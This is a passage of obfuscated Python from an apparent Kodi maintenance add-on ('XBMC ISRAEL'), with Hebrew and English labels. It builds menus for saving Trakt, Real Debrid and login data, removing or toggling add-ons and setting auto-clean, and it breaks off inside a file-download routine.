	addFile ('%s שמירת חשבון סדרות Tv ו Apollo Group:  '%O00OOOOOO0O000OO0 .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keepinfo',icon =ICONTRAKT ,themeit =THEME1 )#line:3159
	addFile ('%s שמירת ספריית סרטים וסדרות:  '%OO000OOO0O0OOO000 .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keepmovielist',icon =ICONTRAKT ,themeit =THEME1 )#line:3162
	addFile ('%s שמירת נתיבי ספריות וידאו:  '%O0OO000O000000O0O .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keepsources',icon =ICONSAVE ,themeit =THEME1 )#line:3163
	addFile ('%s שמירת הגדרות סאונד ורזולוציה:  '%O00OOO000O000O000 .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keepsound',icon =ICONTRAKT ,themeit =THEME1 )#line:3164
	addFile ('%s שמירת הגדרות בסקין :צבעים\תצוגות מדיה  : '%O0OOO00OOOOOOOOOO .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keepview',icon =ICONTRAKT ,themeit =THEME1 )#line:3166
	addFile ('%s שמירת פליליסט לאודר:  '%O00000OOOOO00O00O .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keepplaylist',icon =ICONTRAKT ,themeit =THEME1 )#line:3167
	addFile ('%s שמירת הגדרות באפר: '%O00O000OOOO00OO00 .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keepadvanced',icon =ICONSAVE ,themeit =THEME1 )#line:3172
	addFile ('%s שמירת רשימות ריפו:  '%OO0OO00OO0O0OO000 .replace ('true',OOO0000OO0000O0O0 ).replace ('false',O00OOOOOO0O00O0O0 ),'togglesetting','keeprepos',icon =ICONSAVE ,themeit =THEME1 )#line:3174
	setView ('files','viewType')#line:3176
def traktMenu ():#line:3178
	O0O00000O0O0O0OOO ='[COLOR green]מופעל[/COLOR]'if KEEPTRAKT =='true'else '[COLOR red]מבוטל[/COLOR]'#line:3179
	O0OOO00000OOO0OO0 =str (TRAKTSAVE )if not TRAKTSAVE ==''else 'Trakt hasnt been saved yet.'#line:3180
	addFile ('[I]Register FREE Account at http://trakt.tv[/I]','',icon =ICONTRAKT ,themeit =THEME3 )#line:3181
	addFile ('Save Trakt Data: %s'%O0O00000O0O0O0OOO ,'togglesetting','keeptrakt',icon =ICONTRAKT ,themeit =THEME3 )#line:3182
	if KEEPTRAKT =='true':addFile ('Last Save: %s'%str (O0OOO00000OOO0OO0 ),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3183
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONTRAKT ,themeit =THEME3 )#line:3184
	for O0O00000O0O0O0OOO in traktit .ORDER :#line:3186
		O000OO00OOOO0O0OO =TRAKTID [O0O00000O0O0O0OOO ]['name']#line:3187
		O0O0OO00O0O0OOO00 =TRAKTID [O0O00000O0O0O0OOO ]['path']#line:3188
		OO000O00O0OOO0000 =TRAKTID [O0O00000O0O0O0OOO ]['saved']#line:3189
		O0O00O0O000OOO0O0 =TRAKTID [O0O00000O0O0O0OOO ]['file']#line:3190
		O0O0O0O0O00000OO0 =wiz .getS (OO000O00O0OOO0000 )#line:3191
		O0O00OO0OOOO00OOO =traktit .traktUser (O0O00000O0O0O0OOO )#line:3192
		OO0O00O00OO0OOO00 =TRAKTID [O0O00000O0O0O0OOO ]['icon']if os .path .exists (O0O0OO00O0O0OOO00 )else ICONTRAKT #line:3193
		O00OO00OOOO0O00O0 =TRAKTID [O0O00000O0O0O0OOO ]['fanart']if os .path .exists (O0O0OO00O0O0OOO00 )else FANART #line:3194
		O00OO0O000O00O0OO =createMenu ('saveaddon','Trakt',O0O00000O0O0O0OOO )#line:3195
		OO000OOO0OO00OO00 =createMenu ('save','Trakt',O0O00000O0O0O0OOO )#line:3196
		O00OO0O000O00O0OO .append ((THEME2 %'%s Settings'%O000OO00OOOO0O0OO ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=trakt)'%(ADDON_ID ,O0O00000O0O0O0OOO )))#line:3197
		addFile ('[+]-> %s'%O000OO00OOOO0O0OO ,'',icon =OO0O00O00OO0OOO00 ,fanart =O00OO00OOOO0O00O0 ,themeit =THEME3 )#line:3199
		if not os .path .exists (O0O0OO00O0O0OOO00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OO0O00O00OO0OOO00 ,fanart =O00OO00OOOO0O00O0 ,menu =O00OO0O000O00O0OO )#line:3200
		elif not O0O00OO0OOOO00OOO :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authtrakt',O0O00000O0O0O0OOO ,icon =OO0O00O00OO0OOO00 ,fanart =O00OO00OOOO0O00O0 ,menu =O00OO0O000O00O0OO )#line:3201
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O00OO0OOOO00OOO ,'authtrakt',O0O00000O0O0O0OOO ,icon =OO0O00O00OO0OOO00 ,fanart =O00OO00OOOO0O00O0 ,menu =O00OO0O000O00O0OO )#line:3202
		if O0O0O0O0O00000OO0 =="":#line:3203
			if os .path .exists (O0O00O0O000OOO0O0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importtrakt',O0O00000O0O0O0OOO ,icon =OO0O00O00OO0OOO00 ,fanart =O00OO00OOOO0O00O0 ,menu =OO000OOO0OO00OO00 )#line:3204
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savetrakt',O0O00000O0O0O0OOO ,icon =OO0O00O00OO0OOO00 ,fanart =O00OO00OOOO0O00O0 ,menu =OO000OOO0OO00OO00 )#line:3205
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O0O0O0O0O00000OO0 ,'',icon =OO0O00O00OO0OOO00 ,fanart =O00OO00OOOO0O00O0 ,menu =OO000OOO0OO00OO00 )#line:3206
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3208
	addFile ('Save All Trakt Data','savetrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3209
	addFile ('Recover All Saved Trakt Data','restoretrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3210
	addFile ('Import Trakt Data','importtrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3211
	addFile ('Clear All Saved Trakt Data','cleartrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3212
	addFile ('Clear All Addon Data','addontrakt','all',icon =ICONTRAKT ,themeit =THEME3 )#line:3213
	setView ('files','viewType')#line:3214
def realMenu ():#line:3216
	O0OOO00O0OO0OOO00 ='[COLOR green]ON[/COLOR]'if KEEPREAL =='true'else '[COLOR red]OFF[/COLOR]'#line:3217
	O0OO0O000O00OOO00 =str (REALSAVE )if not REALSAVE ==''else 'Real Debrid hasnt been saved yet.'#line:3218
	addFile ('[I]http://real-debrid.com is a PAID service.[/I]','',icon =ICONREAL ,themeit =THEME3 )#line:3219
	addFile ('Save Real Debrid Data: %s'%O0OOO00O0OO0OOO00 ,'togglesetting','keepdebrid',icon =ICONREAL ,themeit =THEME3 )#line:3220
	if KEEPREAL =='true':addFile ('Last Save: %s'%str (O0OO0O000O00OOO00 ),'',icon =ICONREAL ,themeit =THEME3 )#line:3221
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONREAL ,themeit =THEME3 )#line:3222
	for OOO0OO000O0O00OOO in debridit .ORDER :#line:3224
		OOOO00000O0OOOO0O =DEBRIDID [OOO0OO000O0O00OOO ]['name']#line:3225
		O00OOO00O00OOOO0O =DEBRIDID [OOO0OO000O0O00OOO ]['path']#line:3226
		O0OOO0O00OO00O0OO =DEBRIDID [OOO0OO000O0O00OOO ]['saved']#line:3227
		OO00OO0OOOO000OO0 =DEBRIDID [OOO0OO000O0O00OOO ]['file']#line:3228
		OO000OO0OOO00000O =wiz .getS (O0OOO0O00OO00O0OO )#line:3229
		O0O000OO0O0O0OOO0 =debridit .debridUser (OOO0OO000O0O00OOO )#line:3230
		OOO000OO0OO000O0O =DEBRIDID [OOO0OO000O0O00OOO ]['icon']if os .path .exists (O00OOO00O00OOOO0O )else ICONREAL #line:3231
		O00OO00O0OOO0OOOO =DEBRIDID [OOO0OO000O0O00OOO ]['fanart']if os .path .exists (O00OOO00O00OOOO0O )else FANART #line:3232
		OO000OO0O0000OOO0 =createMenu ('saveaddon','Debrid',OOO0OO000O0O00OOO )#line:3233
		OOOOOOOO0O0000O0O =createMenu ('save','Debrid',OOO0OO000O0O00OOO )#line:3234
		OO000OO0O0000OOO0 .append ((THEME2 %'%s Settings'%OOOO00000O0OOOO0O ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=debrid)'%(ADDON_ID ,OOO0OO000O0O00OOO )))#line:3235
		addFile ('[+]-> %s'%OOOO00000O0OOOO0O ,'',icon =OOO000OO0OO000O0O ,fanart =O00OO00O0OOO0OOOO ,themeit =THEME3 )#line:3237
		if not os .path .exists (O00OOO00O00OOOO0O ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =OOO000OO0OO000O0O ,fanart =O00OO00O0OOO0OOOO ,menu =OO000OO0O0000OOO0 )#line:3238
		elif not O0O000OO0O0O0OOO0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authdebrid',OOO0OO000O0O00OOO ,icon =OOO000OO0OO000O0O ,fanart =O00OO00O0OOO0OOOO ,menu =OO000OO0O0000OOO0 )#line:3239
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O000OO0O0O0OOO0 ,'authdebrid',OOO0OO000O0O00OOO ,icon =OOO000OO0OO000O0O ,fanart =O00OO00O0OOO0OOOO ,menu =OO000OO0O0000OOO0 )#line:3240
		if OO000OO0OOO00000O =="":#line:3241
			if os .path .exists (OO00OO0OOOO000OO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importdebrid',OOO0OO000O0O00OOO ,icon =OOO000OO0OO000O0O ,fanart =O00OO00O0OOO0OOOO ,menu =OOOOOOOO0O0000O0O )#line:3242
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savedebrid',OOO0OO000O0O00OOO ,icon =OOO000OO0OO000O0O ,fanart =O00OO00O0OOO0OOOO ,menu =OOOOOOOO0O0000O0O )#line:3243
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%OO000OO0OOO00000O ,'',icon =OOO000OO0OO000O0O ,fanart =O00OO00O0OOO0OOOO ,menu =OOOOOOOO0O0000O0O )#line:3244
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3246
	addFile ('Save All Real Debrid Data','savedebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3247
	addFile ('Recover All Saved Real Debrid Data','restoredebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3248
	addFile ('Import Real Debrid Data','importdebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3249
	addFile ('Clear All Saved Real Debrid Data','cleardebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3250
	addFile ('Clear All Addon Data','addondebrid','all',icon =ICONREAL ,themeit =THEME3 )#line:3251
	setView ('files','viewType')#line:3252
def loginMenu ():#line:3254
	O00O00OOO00OO000O ='[COLOR green]ON[/COLOR]'if KEEPLOGIN =='true'else '[COLOR red]OFF[/COLOR]'#line:3255
	O000OO0O0O00O0O0O =str (LOGINSAVE )if not LOGINSAVE ==''else 'Login data hasnt been saved yet.'#line:3256
	addFile ('[I]Several of these addons are PAID services.[/I]','',icon =ICONLOGIN ,themeit =THEME3 )#line:3257
	addFile ('Save Login Data: %s'%O00O00OOO00OO000O ,'togglesetting','keeplogin',icon =ICONLOGIN ,themeit =THEME3 )#line:3258
	if KEEPLOGIN =='true':addFile ('Last Save: %s'%str (O000OO0O0O00O0O0O ),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3259
	if HIDESPACERS =='No':addFile (wiz .sep (),'',icon =ICONLOGIN ,themeit =THEME3 )#line:3260
	for O00O00OOO00OO000O in loginit .ORDER :#line:3262
		OOO00OO0O0OOO0O00 =LOGINID [O00O00OOO00OO000O ]['name']#line:3263
		O0O0O0OOOO0000O00 =LOGINID [O00O00OOO00OO000O ]['path']#line:3264
		O0O0OOOOO000000OO =LOGINID [O00O00OOO00OO000O ]['saved']#line:3265
		O0000OOO0O000OOO0 =LOGINID [O00O00OOO00OO000O ]['file']#line:3266
		O00000O0O0OO00O00 =wiz .getS (O0O0OOOOO000000OO )#line:3267
		O0O00000OO00O00O0 =loginit .loginUser (O00O00OOO00OO000O )#line:3268
		O000OOOOO00OO0O00 =LOGINID [O00O00OOO00OO000O ]['icon']if os .path .exists (O0O0O0OOOO0000O00 )else ICONLOGIN #line:3269
		O0O0O0O000O0O00O0 =LOGINID [O00O00OOO00OO000O ]['fanart']if os .path .exists (O0O0O0OOOO0000O00 )else FANART #line:3270
		OOOO0000O00OOOO0O =createMenu ('saveaddon','Login',O00O00OOO00OO000O )#line:3271
		O00O0O0O00OOO00OO =createMenu ('save','Login',O00O00OOO00OO000O )#line:3272
		OOOO0000O00OOOO0O .append ((THEME2 %'%s Settings'%OOO00OO0O0OOO0O00 ,'RunPlugin(plugin://%s/?mode=opensettings&name=%s&url=login)'%(ADDON_ID ,O00O00OOO00OO000O )))#line:3273
		addFile ('[+]-> %s'%OOO00OO0O0OOO0O00 ,'',icon =O000OOOOO00OO0O00 ,fanart =O0O0O0O000O0O00O0 ,themeit =THEME3 )#line:3275
		if not os .path .exists (O0O0O0OOOO0000O00 ):addFile ('[COLOR red]Addon Data: Not Installed[/COLOR]','',icon =O000OOOOO00OO0O00 ,fanart =O0O0O0O000O0O00O0 ,menu =OOOO0000O00OOOO0O )#line:3276
		elif not O0O00000OO00O00O0 :addFile ('[COLOR red]Addon Data: Not Registered[/COLOR]','authlogin',O00O00OOO00OO000O ,icon =O000OOOOO00OO0O00 ,fanart =O0O0O0O000O0O00O0 ,menu =OOOO0000O00OOOO0O )#line:3277
		else :addFile ('[COLOR green]Addon Data: %s[/COLOR]'%O0O00000OO00O00O0 ,'authlogin',O00O00OOO00OO000O ,icon =O000OOOOO00OO0O00 ,fanart =O0O0O0O000O0O00O0 ,menu =OOOO0000O00OOOO0O )#line:3278
		if O00000O0O0OO00O00 =="":#line:3279
			if os .path .exists (O0000OOO0O000OOO0 ):addFile ('[COLOR red]Saved Data: Save File Found(Import Data)[/COLOR]','importlogin',O00O00OOO00OO000O ,icon =O000OOOOO00OO0O00 ,fanart =O0O0O0O000O0O00O0 ,menu =O00O0O0O00OOO00OO )#line:3280
			else :addFile ('[COLOR red]Saved Data: Not Saved[/COLOR]','savelogin',O00O00OOO00OO000O ,icon =O000OOOOO00OO0O00 ,fanart =O0O0O0O000O0O00O0 ,menu =O00O0O0O00OOO00OO )#line:3281
		else :addFile ('[COLOR green]Saved Data: %s[/COLOR]'%O00000O0O0OO00O00 ,'',icon =O000OOOOO00OO0O00 ,fanart =O0O0O0O000O0O00O0 ,menu =O00O0O0O00OOO00OO )#line:3282
	if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3284
	addFile ('Save All Login Data','savelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3285
	addFile ('Recover All Saved Login Data','restorelogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3286
	addFile ('Import Login Data','importlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3287
	addFile ('Clear All Saved Login Data','clearlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3288
	addFile ('Clear All Addon Data','addonlogin','all',icon =ICONLOGIN ,themeit =THEME3 )#line:3289
	setView ('files','viewType')#line:3290
def fixUpdate ():#line:3292
	if KODIV <17 :#line:3293
		O0O00O0O0O0O0O0O0 =os .path .join (DATABASE ,wiz .latestDB ('Addons'))#line:3294
		try :#line:3295
			os .remove (O0O00O0O0O0O0O0O0 )#line:3296
		except Exception as O00OOOO000OO00OOO :#line:3297
			wiz .log ("Unable to remove %s, Purging DB"%O0O00O0O0O0O0O0O0 )#line:3298
			wiz .purgeDb (O0O00O0O0O0O0O0O0 )#line:3299
	else :#line:3300
		xbmc .log ("Requested Addons.db be removed but doesnt work in Kod17")#line:3301
def removeAddonMenu ():#line:3303
	OOO0OO0O0OO00O0OO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3304
	O00O0O0000000OOOO =[];O000O00OOOOOOO0O0 =[]#line:3305
	for OOOO0O0OOOOO00000 in sorted (OOO0OO0O0OO00O0OO ,key =lambda O0000OO000OO00000 :O0000OO000OO00000 ):#line:3306
		O0OOO00O0O0OO0OOO =os .path .split (OOOO0O0OOOOO00000 [:-1 ])[1 ]#line:3307
		if O0OOO00O0O0OO0OOO in EXCLUDES :continue #line:3308
		elif O0OOO00O0O0OO0OOO in DEFAULTPLUGINS :continue #line:3309
		elif O0OOO00O0O0OO0OOO =='packages':continue #line:3310
		O000O00OOOOO0OOOO =os .path .join (OOOO0O0OOOOO00000 ,'addon.xml')#line:3311
		if os .path .exists (O000O00OOOOO0OOOO ):#line:3312
			OOO00OO0O000O0OOO =open (O000O00OOOOO0OOOO )#line:3313
			OO0OOO00O0OOO000O =OOO00OO0O000O0OOO .read ()#line:3314
			O00000000O0OO000O =wiz .parseDOM (OO0OOO00O0OOO000O ,'addon',ret ='id')#line:3315
			OOO00OO000O00O0OO =O0OOO00O0O0OO0OOO if len (O00000000O0OO000O )==0 else O00000000O0OO000O [0 ]#line:3317
			try :#line:3318
				O00O0OO0000O000O0 =xbmcaddon .Addon (id =OOO00OO000O00O0OO )#line:3319
				O00O0O0000000OOOO .append (O00O0OO0000O000O0 .getAddonInfo ('name'))#line:3320
				O000O00OOOOOOO0O0 .append (OOO00OO000O00O0OO )#line:3321
			except :#line:3322
				pass #line:3323
	if len (O00O0O0000000OOOO )==0 :#line:3324
		wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),"[COLOR %s]No Addons To Remove[/COLOR]"%COLOR2 )#line:3325
		return #line:3326
	if KODIV >16 :#line:3327
		O00O0000O0O0OO0OO =DIALOG .multiselect ("%s: Select the addons you wish to remove."%ADDONTITLE ,O00O0O0000000OOOO )#line:3328
	else :#line:3329
		O00O0000O0O0OO0OO =[];O0O00OOOO00000000 =0 #line:3330
		O000O0O00000OO00O =["-- Click here to Continue --"]+O00O0O0000000OOOO #line:3331
		while not O0O00OOOO00000000 ==-1 :#line:3332
			O0O00OOOO00000000 =DIALOG .select ("%s: Select the addons you wish to remove."%ADDONTITLE ,O000O0O00000OO00O )#line:3333
			if O0O00OOOO00000000 ==-1 :break #line:3334
			elif O0O00OOOO00000000 ==0 :break #line:3335
			else :#line:3336
				O00O0OOO0O0O0O0O0 =(O0O00OOOO00000000 -1 )#line:3337
				if O00O0OOO0O0O0O0O0 in O00O0000O0O0OO0OO :#line:3338
					O00O0000O0O0OO0OO .remove (O00O0OOO0O0O0O0O0 )#line:3339
					O000O0O00000OO00O [O0O00OOOO00000000 ]=O00O0O0000000OOOO [O00O0OOO0O0O0O0O0 ]#line:3340
				else :#line:3341
					O00O0000O0O0OO0OO .append (O00O0OOO0O0O0O0O0 )#line:3342
					O000O0O00000OO00O [O0O00OOOO00000000 ]="[B][COLOR %s]%s[/COLOR][/B]"%(COLOR1 ,O00O0O0000000OOOO [O00O0OOO0O0O0O0O0 ])#line:3343
	if O00O0000O0O0OO0OO ==None :return #line:3344
	if len (O00O0000O0O0OO0OO )>0 :#line:3345
		wiz .addonUpdates ('set')#line:3346
		for O0OO0000OO0O0O00O in O00O0000O0O0OO0OO :#line:3347
			removeAddon (O000O00OOOOOOO0O0 [O0OO0000OO0O0O00O ],O00O0O0000000OOOO [O0OO0000OO0O0O00O ],True )#line:3348
		xbmc .sleep (1000 )#line:3350
		if INSTALLMETHOD ==1 :OO0OO0OOOO0O0000O =1 #line:3352
		elif INSTALLMETHOD ==2 :OO0OO0OOOO0O0000O =0 #line:3353
		else :OO0OO0OOOO0O0000O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]סיום התקנה [COLOR %s]סגירה[/COLOR] או [COLOR %s]הצג נתונים[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]הצג נתונים[/COLOR][/B]",nolabel ="[B][COLOR red]סגירה[/COLOR][/B]")#line:3354
		if OO0OO0OOOO0O0000O ==1 :wiz .reloadFix ('remove addon')#line:3355
		else :wiz .addonUpdates ('reset');wiz .killxbmc (True )#line:3356
def removeAddonDataMenu ():#line:3358
	if os .path .exists (ADDOND ):#line:3359
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data','removedata','all',themeit =THEME2 )#line:3360
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Addon_Data for Uninstalled Addons','removedata','uninstalled',themeit =THEME2 )#line:3361
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] All Empty Folders in Addon_Data','removedata','empty',themeit =THEME2 )#line:3362
		addFile ('[COLOR red][B][REMOVE][/B][/COLOR] %s Addon_Data'%ADDONTITLE ,'resetaddon',themeit =THEME2 )#line:3363
		if HIDESPACERS =='No':addFile (wiz .sep (),'',themeit =THEME3 )#line:3364
		O00O0000O0OO0O0O0 =glob .glob (os .path .join (ADDOND ,'*/'))#line:3365
		for O0OOO0OOO00O0OOOO in sorted (O00O0000O0OO0O0O0 ,key =lambda O0OOO0OOOO00O0000 :O0OOO0OOOO00O0000 ):#line:3366
			O0OOOOOOOOO0O00OO =O0OOO0OOO00O0OOOO .replace (ADDOND ,'').replace ('\\','').replace ('/','')#line:3367
			OOOO000O000O00OO0 =os .path .join (O0OOO0OOO00O0OOOO .replace (ADDOND ,ADDONS ),'icon.png')#line:3368
			O00O0OO0OO0000O0O =os .path .join (O0OOO0OOO00O0OOOO .replace (ADDOND ,ADDONS ),'fanart.png')#line:3369
			OO000O0000OO0000O =O0OOOOOOOOO0O00OO #line:3370
			OOOOOOOOO0000000O ={'audio.':'[COLOR orange][AUDIO] [/COLOR]','metadata.':'[COLOR cyan][METADATA] [/COLOR]','module.':'[COLOR orange][MODULE] [/COLOR]','plugin.':'[COLOR blue][PLUGIN] [/COLOR]','program.':'[COLOR orange][PROGRAM] [/COLOR]','repository.':'[COLOR gold][REPO] [/COLOR]','script.':'[COLOR green][SCRIPT] [/COLOR]','service.':'[COLOR green][SERVICE] [/COLOR]','skin.':'[COLOR dodgerblue][SKIN] [/COLOR]','video.':'[COLOR orange][VIDEO] [/COLOR]','weather.':'[COLOR yellow][WEATHER] [/COLOR]'}#line:3371
			for O0OOOO00OO0OOOOO0 in OOOOOOOOO0000000O :#line:3372
				OO000O0000OO0000O =OO000O0000OO0000O .replace (O0OOOO00OO0OOOOO0 ,OOOOOOOOO0000000O [O0OOOO00OO0OOOOO0 ])#line:3373
			if O0OOOOOOOOO0O00OO in EXCLUDES :OO000O0000OO0000O ='[COLOR green][B][PROTECTED][/B][/COLOR] %s'%OO000O0000OO0000O #line:3374
			else :OO000O0000OO0000O ='[COLOR red][B][REMOVE][/B][/COLOR] %s'%OO000O0000OO0000O #line:3375
			addFile (' %s'%OO000O0000OO0000O ,'removedata',O0OOOOOOOOO0O00OO ,icon =OOOO000O000O00OO0 ,fanart =O00O0OO0OO0000O0O ,themeit =THEME2 )#line:3376
	else :#line:3377
		addFile ('No Addon data folder found.','',themeit =THEME3 )#line:3378
	setView ('files','viewType')#line:3379
def enableAddons ():#line:3381
	addFile ("[I][B][COLOR red]!!Notice: Disabling Some Addons Can Cause Issues!![/COLOR][/B][/I]",'',icon =ICONMAINT )#line:3382
	OOOOOO00OO00O0OOO =glob .glob (os .path .join (ADDONS ,'*/'))#line:3383
	O000OO00OO00O0000 =0 #line:3384
	for O0O00O00O0O0O0OO0 in sorted (OOOOOO00OO00O0OOO ,key =lambda OOO0OOO00000O0OOO :OOO0OOO00000O0OOO ):#line:3385
		O0OO0OOOOOOO000OO =os .path .split (O0O00O00O0O0O0OO0 [:-1 ])[1 ]#line:3386
		if O0OO0OOOOOOO000OO in EXCLUDES :continue #line:3387
		if O0OO0OOOOOOO000OO in DEFAULTPLUGINS :continue #line:3388
		O0O000O0O0OO0OOOO =os .path .join (O0O00O00O0O0O0OO0 ,'addon.xml')#line:3389
		if os .path .exists (O0O000O0O0OO0OOOO ):#line:3390
			O000OO00OO00O0000 +=1 #line:3391
			OOOOOO00OO00O0OOO =O0O00O00O0O0O0OO0 .replace (ADDONS ,'')[1 :-1 ]#line:3392
			OO0O00OO00O00OOO0 =open (O0O000O0O0OO0OOOO )#line:3393
			OO0OOOO000OO000O0 =OO0O00OO00O00OOO0 .read ().replace ('\n','').replace ('\r','').replace ('\t','')#line:3394
			O0OOOOOO0O0OOOOOO =wiz .parseDOM (OO0OOOO000OO000O0 ,'addon',ret ='id')#line:3395
			O0O0O0OOO0O0OOO00 =wiz .parseDOM (OO0OOOO000OO000O0 ,'addon',ret ='name')#line:3396
			try :#line:3397
				O00OO00O00000OOOO =O0OOOOOO0O0OOOOOO [0 ]#line:3398
				OO00000O00OOO0OO0 =O0O0O0OOO0O0OOO00 [0 ]#line:3399
			except :#line:3400
				continue #line:3401
			try :#line:3402
				OO0OO00O0O0O000OO =xbmcaddon .Addon (id =O00OO00O00000OOOO )#line:3403
				OO0OOO0OOOOO00O00 ="[COLOR green][Enabled][/COLOR]"#line:3404
				OO0O00OOOO00OOO00 ="false"#line:3405
			except :#line:3406
				OO0OOO0OOOOO00O00 ="[COLOR red][Disabled][/COLOR]"#line:3407
				OO0O00OOOO00OOO00 ="true"#line:3408
				pass #line:3409
			OO0O0O0OO0OO0OO0O =os .path .join (O0O00O00O0O0O0OO0 ,'icon.png')if os .path .exists (os .path .join (O0O00O00O0O0O0OO0 ,'icon.png'))else ICON #line:3410
			OO000O0OO00OOOO00 =os .path .join (O0O00O00O0O0O0OO0 ,'fanart.jpg')if os .path .exists (os .path .join (O0O00O00O0O0O0OO0 ,'fanart.jpg'))else FANART #line:3411
			addFile ("%s %s"%(OO0OOO0OOOOO00O00 ,OO00000O00OOO0OO0 ),'toggleaddon',OOOOOO00OO00O0OOO ,OO0O00OOOO00OOO00 ,icon =OO0O0O0OO0OO0OO0O ,fanart =OO000O0OO00OOOO00 )#line:3412
			OO0O00OO00O00OOO0 .close ()#line:3413
	if O000OO00OO00O0000 ==0 :#line:3414
		addFile ("No Addons Found to Enable or Disable.",'',icon =ICONMAINT )#line:3415
	setView ('files','viewType')#line:3416
def changeFeq ():#line:3418
	OOO0OOOO00OO0O00O =['Every Startup','Every Day','Every Three Days','Every Weekly']#line:3419
	O00000OO0O000O0OO =DIALOG .select ("[COLOR %s]How often would you list to Auto Clean on Startup?[/COLOR]"%COLOR2 ,OOO0OOOO00OO0O00O )#line:3420
	if not O00000OO0O000O0OO ==-1 :#line:3421
		wiz .setS ('autocleanfeq',str (O00000OO0O000O0OO ))#line:3422
		wiz .LogNotify ('[COLOR %s]Auto Clean Up[/COLOR]'%COLOR1 ,'[COLOR %s]Fequency Now %s[/COLOR]'%(COLOR2 ,OOO0OOOO00OO0O00O [O00000OO0O000O0OO ]))#line:3423
def developer ():#line:3425
	addFile ('Convert Text Files to 0.1.7','converttext',themeit =THEME1 )#line:3426
	addFile ('Create QR Code','createqr',themeit =THEME1 )#line:3427
	addFile ('Test Notifications','testnotify',themeit =THEME1 )#line:3428
	addFile ('Test Update','testupdate',themeit =THEME1 )#line:3429
	addFile ('Test First Run','testfirst',themeit =THEME1 )#line:3430
	addFile ('Test First Run Settings','testfirstrun',themeit =THEME1 )#line:3431
	addFile ('Test APk','testapk',themeit =THEME1 )#line:3432
	setView ('files','viewType')#line:3434
def download (OO0O000OOOO0OOO00 ,OOOOOOO0000OO0O00 ):#line:3439
  OO0OO00000OOO000O =xbmc .translatePath (os .path .join ('special://home/addons','packages'))#line:3440
  OOO00000OOO00O00O =xbmcgui .DialogProgress ()#line:3441
  OOO00000OOO00O00O .create ("XBMC ISRAEL","Downloading "+name ,'','Please Wait')#line:3442
  OO000OO00OO0OO00O =os .path .join (OO0OO00000OOO000O ,'isr.zip')#line:3443
  OOO00OOOO0000OOO0 =urllib2 .Request (OO0O000OOOO0OOO00 )#line:3444
  O00O00OO000OO0000 =urllib2 .urlopen (OOO00OOOO0000OOO0 )#line:3445
  O0O0OOOO0OOOO00O0 =xbmcgui .DialogProgress ()#line:3447
  O0O0OOOO0OOOO00O0 .create ("Downloading","Downloading "+name )#line:3448
  O0O0OOOO0OOOO00O0 .update (0 )#line:3449
  OOOOO0O0OO0O00O00 =OOOOOOO0000OO0O00 #line:3450
  OO00OOO0OOO0OO0OO =open (OO000OO00OO0OO00O ,'wb')#line:3451
  try :#line:3453
    OO0000O0O00O0000O =O00O00OO000OO0000 .info ().getheader ('Content-Length').strip ()#line:3454
    OO000O00OO0O0OO0O =True #line:3455
  except AttributeError :#line:3456
        OO000O00OO0O0OO0O =False #line:3457
  if OO000O00OO0O0OO0O :#line:3459
        OO0000O0O00O0000O =int (OO0000O0O00O0000O )#line:3460
  OO000O00000OOO0O0 =0 #line:3462
  OOOO0O0000OO0OO0O =time .time ()#line:3463
  while True :#line:3464
        O0000OO0O0O00OO00 =O00O00OO000OO0000 .read (8192 )#line:3465
        if not O0000OO0O0O00OO00 :#line:3466
            sys .stdout .write ('\n')#line:3467
            break #line:3468
